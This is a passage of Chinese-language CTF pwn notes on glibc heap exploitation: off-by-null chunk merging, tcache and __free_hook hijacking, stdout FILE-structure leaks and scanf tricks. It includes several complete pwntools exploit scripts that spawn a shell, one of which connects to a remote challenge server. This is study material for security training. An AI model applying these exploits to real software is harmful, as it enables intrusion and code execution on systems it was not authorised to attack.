ia()
```







### scanf è·³è¿‡è¯»å…¥æ¼æ´

```c
def getint():
	size_t tmp;
    scanf("%lld", &tmp);
    return tmp;

choice = getint();

switch(choice){
     ...
     default:
        printf("Invalid choice: %d.\n", choice);
}
```

è¾“å…¥- æˆ– + ç­‰å­—ç¬¦è®©scanfä¸è¯»å…¥ä»»ä½•æ•°æ®ï¼Œåˆ™tmpæ˜¯ä¸€ä¸ªæœªåˆå§‹åŒ–çš„å€¼ï¼Œé‚£ä¹ˆå¯ä»¥ç»è¿‡printfæ‰“å°å‡ºæ¥ï¼Œä»è€Œæ³„éœ²æ ˆä¸Šçš„æ•°æ®ã€‚æœ‰çš„æ—¶å€™å¯ä»¥é€šè¿‡è¯¥æ–¹å¼æ³„éœ²libcç­‰é‡è¦çš„å€¼

### srand(time(0))éšæœºæ•°ç»•è¿‡

```python
from ctypes import *
libc1 = cdll.LoadLibrary('./libc-2.31.so')
libc1.srand(0) # libc1.()æ‹¬å·é‡Œçš„å†…å®¹å¯ä»¥ä¸ºtime(0)ç­‰
j = str((libc1.rand()+1)%3)
```

### close(0/1/2)å…³é—­è¾“å…¥è¾“å‡ºæµ

å¦‚æœä½¿ç”¨close(1)å…³é—­äº†è¾“å‡ºæµï¼Œå¯ä»¥ä½¿ç”¨exec 1>&0å°†å…¶é‡å®šå‘åˆ°stdinï¼Œå› ä¸ºè¿™ä¸‰ä¸ªéƒ½æ˜¯æŒ‡å‘ç»ˆç«¯çš„ï¼Œå¯ä»¥å¤ç”¨ã€‚

æˆ–è€…

ç›´æ¥ä¿®æ”¹æ‰_IO_2_1_stdout_çš„_filenoå­—æ®µä¸º2(é”™è¯¯æµ)æˆ–è€…0(è¾“å…¥æµ)ï¼Œä¹Ÿå¯ä»¥å†æ¬¡æ‰“å¼€stdoutã€‚

å¦‚æœé¢˜ç›®æ˜¯
æ ¼å¼åŒ–å­—ç¬¦ä¸²
close(1)

ä¸»è¦çš„2ç§è§£å†³åŠæ³•ï¼š
+ å°†_IO_2_1_stdout_çš„filenoå­—æ®µæ”¹ä¸º2
+ å°†stdoutçš„æŒ‡é’ˆï¼ˆä¸€èˆ¬ä½äºbssï¼‰æŒ‡å‘stderr


### æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼šæ”¹printfè¿”å›åœ°å€åˆ°_start

è‹¥æ”¹printfè¿”å›åœ°å€åˆ°_startï¼Œæˆ‘ä»¬ä¾¿ä¼šåœ¨æ ˆä¸Šç•™ä¸‹ä¸€ä¸ª_IO_2_1_stdout_çš„æŒ‡é’ˆ
å†æ¬¡è¿è¡Œåˆ°è¿™é‡Œæ—¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥é¦–å…ˆä¿®æ”¹è¯¥æŒ‡é’ˆæœ«å°¾ä½¿å…¶æŒ‡å‘å…¶filenoï¼Œå°†å…¶æ”¹ä¸º2ã€‚å³å¯ç»•è¿‡ã€‚

### æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼šåˆ©ç”¨magic_gadgetæ”¹bssä¸Šçš„stdoutæŒ‡é’ˆ

bssä¸Šçš„stdoutå’Œstderrä¸€èˆ¬åä¸‰ä½ä¸åŒï¼Œå› æ­¤ä¹Ÿéš¾ä»¥ç›´æ¥ä¿®æ”¹ã€‚

ä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨magic_addræ¥ä¿®æ”¹bssä¸Šçš„stdoutæŒ‡é’ˆä¸º_IO_2_1_stderr_ã€‚

æœ‰å…³magic_gadgetå¯ä»¥çœ‹æœ¬æ–‡çš„magic gadgetéƒ¨åˆ†å†…å®¹ã€‚

æ­¤å¤–éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¿®æ”¹ååªèƒ½ç”¨printfè€Œä¸æ˜¯putsæ¥æ³„éœ²å†…å®¹ï¼Œå› ä¸ºputsæ˜¯ä¸èµ°bssä¸Šçš„IOçš„ã€‚

### readå‡½æ•°è¿”å›0æˆ–-1

ä¸å…³é—­è¾“å…¥é€šé“

```python
# read è¿”å›å€¼ä¸º 0 
from pwn import *
import tty
p = process("./eof_1",stdin=PTY,raw=False)
p.send(chr(tty.CEOF))
p.clean()

```

å…³é—­è¾“å…¥é€šé“

å¯ä»¥ç”¨p.shutdown_raw('send')æ¥å‘é€EOFï¼Œæ•ˆæœæ˜¯è®©readå‡½æ•°è¿”å›0ã€‚

### realloc_hook è°ƒæ•´æ ˆå¸§

```python
malloc_hook = libc_base + libc.sym['__malloc_hook']
realloc = libc_base + libc.sym['realloc']
realloc_hook = libc_base + libc.sym['__realloc_hook']
one = libc_base + 0x4527a

# åŠ«æŒmallocä¸º'a'*0xb+p64(one)+p64(realloc+xxx)
edit(1,0x10,p64(malloc_hook-0x23))
add(0x68,'a')# 3
add(0x68,'a'*0xb+p64(one)+p64(realloc+xxx))# æ‰‹åŠ¨è°ƒæ•´
```


### è®¡ç®—å™¨é¢˜ç›®

é€šå¸¸ç”¨æ ˆä½œä¸ºè®¡ç®—çš„ä½ç½®ï¼Œå³å­˜æ”¾è®¡ç®—çš„è¿‡ç¨‹ä¿¡æ¯ï¼Œ+-ç¬¦å·ç­‰

è¾“å‡ºç»“æœçš„åœ°æ–¹ç”¨æ•°ç»„å¼•ç´¢æ•°ç»„è¶Šç•Œ == æ³„éœ²libc



## å †é£æ°´è‰ºæœ¯ğŸ¨

glibcå †ç®¡ç†ç³»ç»Ÿç¼ºé™·ï¼Œæ¡ˆä¾‹åˆ†æ

### å¸¸è§æ¼æ´ç‚¹å’Œæ€è·¯
+ 

+ å…¨å±€å˜é‡ä½œifæ¯”è¾ƒ
å…¨å±€å˜é‡è¢«èµ‹å€¼åè¿›è¡Œifåˆ¤æ–­ï¼Œåˆ¤æ–­å¤±è´¥ä¸ä¼šè¿›å…¥å¤„ç†ï¼Œå¯¼è‡´å…¨å±€å˜é‡å·²ç»æ”¹å˜ä½†æ˜¯æœªå¤„ç†ï¼Œç”¨äºsizeæº¢å‡º

+ printfæ ¼å¼åŒ–å­—ç¬¦ä¸²åšæ³„éœ²
%s   æŒ‡é’ˆæˆ–è€…æ•°ç»„(èƒ½å»å¼•ç´¢)
%d ä¸å¤Ÿåœ°å€é•¿åº¦çš„æ•°(ä¸èƒ½å¼•ç´¢)

+ scanfæ¥è¯»å…¥å†…å®¹
scanfè¯»å…¥å†…å®¹è‡³å †å— == å †æº¢å‡º

+ editå’Œshowçš„æ˜¯åŒä¸€ä¸ªå †å—
å¯ç”¨æ¥ä¼ªé€ chunk

+ showèƒ½è¾“å‡ºå †å—å†…å®¹
è¾“å‡ºunsortbinå°šå­˜çš„libcåœ°å€ ï¼ˆå¸¸è§„ï¼‰

+ addåŠŸèƒ½mallocç”³è¯·å †å—sizeæ— é™åˆ¶
èƒ½ç”³è¯·åˆ°ä¸€ä¸ªlibcåœ°å€

+ æ¶‰åŠåˆ°å¼€å¯fdå¥æŸ„
å¾€å¾€é€šè¿‡è¦†ç›–å®ç°å¼€å¯0å·fd

+ ä»»æ„libcåœ°å€å†™å€¼(æ— è¦æ±‚)
IO_list_all/global_max_fast

+ æ•°ç»„ä¸‹æ ‡ä¸èƒ½ä¸ºintå’Œcharç±»å‹ï¼
ä¼šå¯¼è‡´è¶Šç•Œ

+ è¾“å…¥åç¼ºå°‘sizeæ ¡éªŒ
æ­£å‘è¶Šç•Œï¼Œeditè¶Šç•Œå¯¼è‡´å¯ä»¥ä¿®æ”¹ä¸‹ä¸€ä¸ªsize

+ åµŒå¥—ç´¢å¼•è¡¨ç»“æ„

æœºåˆ¶æ¯”è¾ƒå®Œå–„çš„æƒ…å†µä¸‹ï¼Œè€ƒè™‘èƒ½å¦åŠ«æŒç»“æ„ä½“é“¾è¡¨çš„è¡¨å¤´ï¼Œä¸€æ—¦åŠ«æŒè¡¨å¤´å°±æœ‰äº†å®Œå…¨æ§åˆ¶æƒ
ç‰¹åˆ«æ˜¯å­˜æ”¾è¡¨å¤´åœ°å€çš„å˜é‡æ”¾åœ¨æ ˆä¸Š
ç„¶åæ˜¯ï¼Œä¼ªé€ ç»“æ„ä½“è¡¨é¡¹ï¼Œå› ä¸ºè¿™ç§åŠŸèƒ½é’ˆå¯¹çš„éƒ½æ˜¯ç»“æ„ä½“è¡¨é¡¹ï¼Œåªè¦èƒ½ä¼ªé€ å°±èƒ½åˆ©ç”¨åŠŸèƒ½å®ç°ä»»æ„åœ°å€å†™



è¿å¼•pltç»“æ„
showå¤–å±‚â€œå§“åâ€ï¼Œâ€œå§“åâ€è¿æ¥åˆ°å †å—åœ°å€->ç›´æ¥æ‰§è¡Œåœ°å€->è°ƒç”¨printf_gotè¡¨è¦†å†™

+ åœ¨è°ƒç”¨ pool_alloc å‡½æ•°æ—¶ä½¿ç”¨ 32 ä½æ•°å€¼ + 1 æ‹“å±•æˆ 64 ä½çš„æ–¹æ³•
å­˜åœ¨æ•´æ•°æº¢å‡º

+ å‡ºç°ç‰¹æ„çš„ä¸åŒsizeçš„å †å—
æƒ³åˆ°åˆ‡å‰²ï¼Œæƒ³åˆ°å †å 

### Fuzzæ‰¾æ¼æ´

w: æ¸…ç©ºåè¦†å†™ï¼Œæ²¡æœ‰å…ˆåˆ›å»º
a: è¿½åŠ ï¼Œæ²¡æœ‰å…ˆåˆ›å»º
r: ä¸æ¸…ç©ºè¦†å†™ï¼Œæ²¡æœ‰ä¼šæŠ¥é”™
æ‰€æœ‰åè¾¹å¤šä¸€ä¸ª+ï¼Œéƒ½æ˜¯åŒæ—¶è¯»å†™

```python
def fuzz():
    f=open('./log.txt','w')
    for i in range(0x1000):
        if(i%10==0):
            a = randint(0,8)
            b = randint(0,8)
            add(a,b,str(i))
            data0=r.recvuntil('Choice Table')
            if 'two many' in data0:
                break
            f.write(' add({},{},str({}))\n'.format(a,b,i))
        elif(i%2==0):
            a = randint(0,8)
            b = randint(0,8)
            delet(a,b)
            data0=r.recvline()
            if 'not exists' in data0:
                continue
            f.write(' delet({},{})\n'.format(a,b))
        else:
            continue
            a = randint(0,8)
            b = randint(0,8)
            c = randint(0,8)
            d = randint(0,8)
            query(a,b,c,d)
            data0=r.recvuntil('Choice Table')
            if 'totally 0 elements' in data0:
                continue
            elif '\x55' in data0:
                f.write(' query({},{},{},{})\n'.format(a,b,c,d))
                break
            elif '\x56' in data0:
                f.write(' query({},{},{},{})\n'.format(a,b,c,d))
                break
    f.close()
```


```python
def fuzz():
    f=open('log.txt','w')
    for i in range(0,0x1000):
        if i % 10 == 0:
           idx=randint(0,0x10)
           add(idx,0x20)
           f.write('add({},0x20)'.format(idx)+'\n')
        elif i % 2 == 0 :
           idx=randint(0,0x10)
           delet(idx)
           f.write('delt({})'.format(idx)+'\n')
        elif i % 3 == 0 :
           idx=randint(0,0x10)
           show(idx)
           r.recvuntil('>>: ')
           check_char=r.recv(1)
           if check_char == '\x55' or check_char == '\x56':
              f.write('show({})'.format(idx)+'\n')
              break            
    f.close()
```


### musl

```bash
sudo cp ./libc.so /lib/ld-musl-x86_64.so.1
sudo cp ./libc.so /usr/local/musl/lib/libc.so

ld-musl-x86_64.so.1 -> /usr/local/musl/lib/libc.so
```


### æ—  show çš„å †é¢˜

+ é€šè¿‡stdoutæ³„éœ²è¾“å‡ºlibcåœ°å€

è‹¥ç¨‹åºèµ‹äºˆäº†æˆ‘ä»¬ä¿®æ”¹stdoutçš„èƒ½åŠ›ï¼Œä¸”ç¨‹åºä¼šè°ƒç”¨ç›¸å…³IOçš„å‡½æ•°ï¼ˆå¦‚putï¼Œprintfï¼‰ï¼Œåˆ™å¯ä»¥é€šè¿‡è¯¥æ–¹å¼æ¥è¾“å‡ºlibcçš„åœ°å€ï¼ˆç¼“å†²åŒºåˆ·æ–°ä¼šå°†ç¼“å†²åŒºä¸­çš„æ•°æ®å†™å…¥åˆ°å®é™…çš„è¾“å‡ºè®¾å¤‡ï¼‰
è‹¥ç¨‹åºæ²¡æœ‰è°ƒç”¨IOå‡½æ•°ï¼Œæ— æ³•é€šè¿‡è¯¥æ–¹å¼æ¥è¾“å‡ºï¼ˆ__malloc_assertä¸­å«æœ‰fxprintfï¼‰

![](https://xzfile.aliyuncs.com/media/upload/picture/20240727215814-449f2fd0-4c20-1.png)


é‚£ä¹ˆå¯ä»¥è€ƒè™‘é€šè¿‡åˆ©ç”¨unsortedbinä¸­æ®‹ç•™çš„libcæŒ‡é’ˆ
é€šè¿‡è¦†ç›–ä½åœ°å€çš„æ–¹å¼æ¥ç”³è¯·åˆ°stdoutçš„åœ°å€ï¼Œä»è€Œä¿®æ”¹IOç»“æ„ä½“ç»“åˆIOå‡½æ•°åˆ·æ–°æ³„éœ²åœ°å€

```c
p64(0xfbad1887)+p64(0)*3+p8(0x58)

p64(0xfbad1800)+p64(0)*3+'\x00'

flat([0x00000000fbad3887,0,0,0,environ_libc,environ_libc+8,environ_libc+8,environ_libc+8])
```

IOç»“æ„ä½“å¦‚ä¸‹

```shell
pwndbg> p stdin
$1 = (FILE *) 0x7f250d9b98e0 <_IO_2_1_stdin_>
pwndbg> fp 0x7f250d9b98e0
$2 = {
  file = {
    _flags = -72540021,
    _IO_read_ptr = 0x7f250d9b9963 <_IO_2_1_stdin_+131> "\n",
    _IO_read_end = 0x7f250d9b9963 <_IO_2_1_stdin_+131> "\n",
    _IO_read_base = 0x7f250d9b9963 <_IO_2_1_stdin_+131> "\n",
    _IO_write_base = 0x7f250d9b9963 <_IO_2_1_stdin_+131> "\n",
    _IO_write_ptr = 0x7f250d9b9963 <_IO_2_1_stdin_+131> "\n",
    _IO_write_end = 0x7f250d9b9963 <_IO_2_1_stdin_+131> "\n",
    _IO_buf_base = 0x7f250d9b9963 <_IO_2_1_stdin_+131> "\n",
    _IO_buf_end = 0x7f250d9b9964 <_IO_2_1_stdin_+132> "",
    _IO_save_base = 0x0,
    _IO_backup_base = 0x0,
    _IO_save_end = 0x0,
    _markers = 0x0,
    _chain = 0x0,
    _fileno = 0,
    _flags2 = 0,
    _old_offset = -1,
    _cur_column = 0,
    _vtable_offset = 0 '\000',
    _shortbuf = "\n",
    _lock = 0x7f250d9bb720 <_IO_stdfile_0_lock>,
    _offset = -1,
    _codecvt = 0x0,
    _wide_data = 0x7f250d9b99c0 <_IO_wide_data_0>,
    _freeres_list = 0x0,
    _freeres_buf = 0x0,
    __pad5 = 0,
    _mode = -1,
    _unused2 = '\000' <repeats 19 times>
  },
  vtable = 0x7f250d9b8030 <_IO_file_jumps>
}
pwndbg> dq 0x7f250d9b98e0
00007f250d9b98e0     00000000fbad208b 00007f250d9b9963
00007f250d9b98f0     00007f250d9b9963 00007f250d9b9963
00007f250d9b9900     00007f250d9b9963 00007f250d9b9963
00007f250d9b9910     00007f250d9b9963 00007f250d9b9963
```

+ é€šè¿‡stderrè¾“å‡ºæ•æ„Ÿä¿¡æ¯(flag)

æˆ‘ä»¬å¯ä»¥ä½¿å¾—ç¨‹åºè§¦å‘__malloc_assert()ï¼Œä»è€Œè§¦å‘_IO_2_1_stderr_æ¥è¾“å‡ºæŠ¥é”™ä¿¡æ¯ã€‚ç”±äºè§¦å‘äº†__malloc_assertå¾€å¾€ä¼šä½¿å¾—ç¨‹åºé€€å‡ºï¼Œå› æ­¤åªæœ‰flagç­‰æ•æ„Ÿä¿¡æ¯å·²ç»è¢«è¯»å–åˆ°å†…å­˜ç©ºé—´åï¼Œå†ç›´æ¥é€šè¿‡æŠ¥é”™è¾“å‡º

stderrçš„è¾“å‡ºå’Œstdoutç±»ä¼¼ï¼Œéœ€è¦å°†_flagsæ”¹ä¸º0xfbad1887ï¼Œç„¶åè¾“å‡º_IO_write_baseå’Œ_IO_write_pträ¹‹é—´çš„å†…å®¹

è¿™æ˜¯å› ä¸º__malloc_assertä¸­çš„__fxprintfå‡½æ•°æ˜¯IOå‡½æ•°ï¼Œä¸”å…¶ç¬¬ä¸€ä¸ªå‚æ•°ä¼ å‚ä¸ºNULLçš„æ—¶å€™ä¼šè½¬æ¢ä¸ºstderrï¼Œè¾¾åˆ°æ³„éœ²çš„ç›®çš„ã€‚

+ æ”¾å¼ƒæ³„éœ²libcåœ°å€

ç›´æ¥é€šè¿‡ä¿®æ”¹unsortedbinçš„fdæŒ‡é’ˆ(0x7f)å’Œgotè¡¨(0x7f)ä¿¡æ¯ç­‰æ–¹å¼æ¥è·å¾—å…¶ä»–libcå‡½æ•°çš„æ‰§è¡Œèƒ½åŠ›ã€‚
æˆ–è€…æ˜¯æ²¡æœ‰libcç‰ˆæœ¬çš„æƒ…å†µï¼Œå³ä¾¿èƒ½æ³„éœ²readçš„çœŸå®åœ°å€ï¼Œä¹Ÿæ²¡åŠæ³•ç®—å‡ºlibcçš„åç§»ï¼Œä»ç„¶ä¾èµ–ç¨‹åºçš„gotè¡¨ï¼Œä½¿ç”¨å·²æœ‰çš„å‡½æ•°å®ç°ropï¼Œæƒ³getshellå°±åªèƒ½ä¾é syscallï¼Œsyscall=read+0xeï¼Œå†åˆ©ç”¨csureadexecä¸€æ³¢æµ

### æ—  edit çš„å †é¢˜

æ— editï¼Œåˆéœ€è¦ä¿®æ”¹fdæŒ‡é’ˆå®ŒæˆåŠ«æŒï¼Œå¯ä»¥æ„é€ ä¸€ä¸ªå †å¤ç”¨(dup)ï¼Œä¾‹å¦‚åœ¨fastbinchunkå’Œunsortbinchunkæ˜¯ä¸€ä¸ªå¤´èŠ‚ç‚¹ï¼Œé‚£æˆ‘æ”¹unsortbinçš„fdé‚£fasbinå°±å’Œä¸€èµ·å˜ï¼Œè¿™é‡Œæ¢ä¸ªsizeåˆ‡å‰²ï¼Œå°±ä¸ä¼šå½±å“çš„fasbinchunkäº†

### æ·å¾„-scanfæ³„éœ²libc

åˆ©ç”¨malloc_åˆå¹¶å®ç°è®²fastbinä¸­çš„æ‰€æœ‰å †å—åˆå¹¶æ”¾å…¥largebinæˆ–è€…smallbinï¼Œä»è€Œç²˜å–libcåœ°å€

```c
__isoc99_scanf("%u", &v3);

p.sendlineafter('Your choice: ','99999999'*0xf0)
```

### é“¾å¼ç´¢å¼•è¡¨å †é¢˜

å³å¤šçº§ç´¢å¼•è¡¨
è¿™é‡Œä¸»è¦æŒ‡çš„æ˜¯ä»¥é“¾è¡¨å½¢å¼ç®¡ç†çš„å †å—ç»“æ„ï¼Œæ¶‰åŠåˆ°åŒé“¾è¡¨ï¼Œå•é“¾è¡¨çš„è„±é“¾å’Œæ’å…¥ç­‰

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231127155812.png)
ä½†å®é™…æƒ…å†µä¼šæ›´å¤æ‚ï¼Œå› ä¸ºä¼šæœ‰çš„ç”³è¯·å¤šä¸ªé™„å±å †å—ï¼Œä¸€èˆ¬æ¥è¯´éƒ½æ˜¯å¯ä»¥showé™„å±å †å—çš„å†…å®¹ï¼Œæ‰€ä»¥æ ¸å¿ƒæŠ€å·§å°±æ˜¯åŠ«æŒ0x50å †å—

### offbynullä¸å †å—åˆå¹¶

```c
__int64 __fastcall sub_9F5(_BYTE *a1, int a2)
{
  int i; // [rsp+14h] [rbp-Ch]

  if ( a2 <= 0 )
    return 0LL;
  for ( i = 0; ; ++i )
  {
    if ( read(0, a1, 1uLL) != 1 )
      return 1LL;
    if ( *a1 == '\n' )
      break;
    ++a1;
    if ( i == a2 )
      break;
  }
  *a1 = 0;                                      // offbynull
  return 0LL;
}
```

æ³¨æ„ï¼š
**é«˜ç‰ˆæœ¬(2.31ä»¥ä¸Š)è¦å †åœ°å€çš„ï¼Œæœ‰å°±ç®€å•ï¼Œæ²¡æœ‰å°±éœ€è¦èƒ½ç”³è¯·å°sizeçš„å †å—åšå †å **
**æ²¡æœ‰editçš„æƒ…å†µï¼Œå‚è€ƒä¸‹è¾¹çš„è®°å½•**



åŸç†ï¼š

åˆ©ç”¨å †çš„åˆå¹¶æœºåˆ¶ï¼Œå½“æ£€æµ‹åˆ°å­˜åœ¨prevsizeä½ï¼Œå½“å‰å †å—prechunk_size_inuseä½ä¸º0ï¼ˆè¿™é‡Œæ³¨æ„sizeçš„å¤„ç†ï¼Œ0xf8ï¼ˆ0x100ï¼‰çš„å †å—ï¼Œä¼šè¢«æ ‡è®°ä¸º0x101ï¼Œè€Œoffbynulä¼šä½¿å…¶ä¸º0x100ï¼Œè¿™æ ·æ˜¯ä¸æ”¹å˜sizeå¤§å°çš„ï¼Œä¸ç„¶ä¼šå¯¼è‡´sizeå¤§å°çš„æ”¹å˜ï¼‰ï¼Œä¸”prevsizeä½\==ä¸Šä¸ªå †å—çš„sizeä½ï¼Œfreeçš„æ—¶å€™å°±é¡ºä¾¿åˆå¹¶ä¸Šä¸€ä¸ªå †å—ã€‚é«˜ç‰ˆæœ¬ï¼Œå¤šä¸€ä¸ªcheck(å¯¹ä¸Šä¸€ä¸ªå †å—çš„)

**ç®€è€Œè¨€ä¹‹ï¼Œåˆå¹¶çš„å…³é”®åœ¨äºå¤´å°¾freeçš„çŠ¶æ€ï¼Œä¿®æ”¹prevsizeç›¸å½“äºæ¢å¤´**





![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/26177342-3385e98bb1814af0.png)
checkå³é’ˆå¯¹æ¢å¤´çš„ï¼Œå¯ä»¥ç›´æ¥è®¾ç½®ä¸Šä¸€ä¸ªå †å—çš„fdå’Œbkéƒ½ä¸ºå®ƒè‡ªå·±(head)æ¥ç»•è¿‡

å¯ä»¥ç”¨æ¥æ„é€ å †å 

```
a  
	è®¾ç½®prevsizeï¼Œé¡ºä¾¿offbynull
b	freeè¿™ä¸ªå †å—

c
```

å†ç”³è¯·å‡ºæ¥å°±æœ‰libcäº†(mainarena+96ï¼Œè¿™ä¸ªåœ°å€é€šå¸¸ä½ä½ä¸º\0)

åç»­åå¤ç”³è¯·å›æ¥åˆ©ç”¨è¿™ä¸ªå †å ç»“æ„åŠ«æŒtcacheå®ç°ä»»æ„åœ°å€ç”³è¯·

#### ä½ç‰ˆæœ¬

2.27åŠŸèƒ½é½å…¨

```python
from pwn import *
context.log_level = 'debug'
context.arch='amd64'

s       = lambda data               :p.send(data)
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(data)
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
uu32    = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
uu64    = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
lg      = lambda name,data          :p.success(name + "-> 0x%x" % data)

p = process("old_school_revenge")
elf = ELF('old_school_revenge')
libc = elf.libc

def cmd(choice):
	sla('Your choice: ',choice)
def add(idx,size):
	cmd(1)
	sla('Index: ',idx)
	sla('Size: ',size)

def edit(idx,content):
	cmd(2)
	sla('Index: ',idx)
	p.sendlineafter(': ',content)

def show(idx):
	cmd(3)
	sla('Index: ',idx)

def delete(idx):
	cmd(4)
	sla('Index: ',idx)
def dbg():
	gdb.attach(p)
	pause()

for i in range(9):
	add(i,0x48)
for i in range(8):
	delete(i)

p.sendlineafter('Your choice: ','99999999'*0xf0)
for i in range(7):
	add(i,0x48)

add(7,0x48)
show(7)
p.recvuntil('Content: ')
libc_base = u64(p.recv(6)+'\x00'*2)-160-0x3EBC40
lg('libc_base',libc_base)
free=libc_base+libc.sym['__free_hook']
sys=libc_base+libc.sym['system']
# å‰é¢æ˜¯çœ‹åˆ°scanfè¾“å…¥ç›´æ¥æŠ„æ¿å­æ¢­å“ˆäº†ï¼Œè·å–åˆ°libc
for i in range(10,17):
	add(i,0xf8)
add(17,0xf8)
add(18,0x88)# editä¸­é—´è¿™ä¸ªchunk
add(19,0xf8)
add(20,0x88)
for i in range(10,17):
	delete(i)

delete(17)
edit(18,'a'*0x80+p64(0x190))
delete(19)
for i in range(10,17):
	add(i,0xf8)
add(21,0xf8)
add(22,0x88)
delete(18)
edit(22,p64(free))
add(23,0x88)
edit(23,'/bin/sh\x00')
add(24,0x88)
edit(24,p64(sys))
delete(23)
p.interactive()
```


2.27 æ— edit

```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

p = remote("139.196.183.57","32022") #typ="udp"
# p = process("./vuln")
elf = ELF("./vuln")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','64']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

def add(idx,size,con="a"):
    sla("Your choice:",1)
    sla("Index:",idx)
    sla("Size:",size)
    sa("Content:",con)

def show(idx):
    sla("Your choice:",2)
    sla("Index:",idx)


def dele(idx):
    sla("Your choice:",3)
    sla("Index:",idx)


for i in range(0,7):add(i,0xf8)

add(7,0xf8)
add(8,0x78)
add(9,0xf8)
add(10,0x78)

for i in range(0,7):dele(i)


dele(7)
dele(8)
add(8,0x78,'\x00'*0x70+p64(0x180))
dele(9)


for i in range(0,7):
	add(i,0xf8)

add(11,0xf8)

show(8)
libc_base = l64()-0x3ebca0
lg("libc_base")
free_hook=libc_base+libc.sym['__free_hook']
system=libc_base+libc.sym['system']

add(12,0x78)
add(13,0xf8)

for i in range(0,7):dele(i)
for i in range(0,7):add(i,0x78)
add(14,0x78)
for i in range(0,7):dele(i)

dele(8)
dele(14)
dele(12)
for i in range(0,7):add(i,0x78)

add(8,0x78,p64(free_hook))
add(12,0x78)
add(14,0x78,"/bin/sh\x00")
add(15,0x78,p64(system))

dele(14)
ia()
```


#### é«˜ç‰ˆæœ¬(2.29ä»¥ä¸Š)

å¦‚æœæ²¡æœ‰åœ°å€éœ€è¦ä¾é offbynullæ³„éœ²åœ°å€ï¼Œå°±ç¨å¾®éº»çƒ¦ä¸€ç‚¹

éœ€è¦å‡ ä¸ªæ¡ä»¶ï¼š

* èƒ½ç”³è¯·0x20ï¼Œæœ€åå †å åˆ‡å‰²éœ€è¦ä¸€ä¸ªæœ€å°sizeçš„å †

```python
from pwn import *
context.log_level = 'debug'

s       = lambda data               :p.send(data)
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(data)
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
uu32    = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
uu64    = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
lg      = lambda name,data          :p.success(name + "-> 0x%x" % data)

p = process("bornote")
elf = ELF('bornote')
libc = elf.libc

def cmd(choice):
	sla("aaa's cmd: ",choice)

def add(size):
	cmd(1)
	sla('Size: ',size)

def edit(idx,content):
	cmd(3)
	sla('Index: ',idx)
	p.sendlineafter('Note: ',content)

def show(idx):
	cmd(4)
	sla('Index: ',idx)

def delete(idx):
	cmd(2)
	sla('Index: ',idx)

def dbg():
	gdb.attach(p)
	pause()
fakechunk = 0x00005561306c6f00
sla('username: ','aaa')


# è¿™é‡Œsizeæœ€å¤§æœ€å¥½åˆ«è¶…è¿‡0x440ï¼Œä¸ç„¶æ”¾è¿›largebinæ—¶/ä¸åœ¨åŒä¸€ä¸ªåŒºé—´ä¸Š
add(0x418) # 0 
add(0x128) # 1 # æœ€åç»•è¿‡tcacheä¸ªæ•°æ£€æµ‹ï¼Œå’Œæœ€ååˆ©ç”¨å †å¤ç”¨çš„chunkä¸€æ ·å¤§
add(0x418) # 2
add(0x438) # 3 
add(0x148) # 4
add(0x428) # 5 
add(0x138) # 6

# fakechunk ç²˜fdå’Œbk
delete(0)
delete(3)
delete(5)

#è®¾ç½®fakechunk sizeä½
delete(2) 
add(0x438)  # 0 
edit(0,'a' * 0x418 + p64(0xb01)[:7])
add(0x418)  # 2 
add(0x428)  # 3 
add(0x418)  # 5 

# è®¾ç½®bk
delete(5)
delete(2)
add(0x418)  # 2 
edit(2,p64(0))
add(0x418)  # 5 

# è®¾ç½®fd
delete(5)
delete(3)
add(0x5f8)# 3 # ç½®å…¥largebin
add(0x428)# 5
edit(5,'')
add(0x418)# 7
add(0xf8)# 8

# è®¾ç½®prevsize
edit(6,'a'*0x130+p64(0xb00))
delete(3)

add(0x10)# 3
show(7)
p.recvuntil("Note: ")
libc_base = u64(p.recv(6).ljust(8,'\x00'))- 0x1EBBE0
lg('libc_base',libc_base)
sys = libc_base + libc.sym["system"]
free_hook = libc_base + libc.sym["__free_hook"]
#----------------------------------------------------------------
add(0x128)#9
delete(1)
delete(9)
edit(7,p64(free_hook))
add(0x128)# 1
add(0x128)# 9
edit(1,"/bin/sh\x00")
edit(9,p64(sys))
